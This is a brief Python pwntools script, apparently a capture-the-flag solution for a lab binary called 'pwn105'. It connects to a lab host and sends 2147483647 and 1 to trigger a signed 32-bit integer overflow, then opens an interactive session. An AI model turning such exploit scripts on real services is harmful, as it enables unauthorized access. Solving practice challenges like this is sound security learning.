#!/usr/bin/env python3
# this is integer overflow challenge, we need to do the sum lower than 0, but we cannot input negative number for num1 and num2. So we can use 2147483647 (the maximum value for a signed 32-bit intege) and 1 to get negative result

from pwn import *

host = "10.10.198.33"
port = 9005

context.log_level = 'warning'
context.arch = 'amd64'

binary = ELF("./pwn105")
#p = process("./pwn105")
p = remote(host,port)

p.sendline(b"2147483647")
p.sendline(b"1")

p.interactive()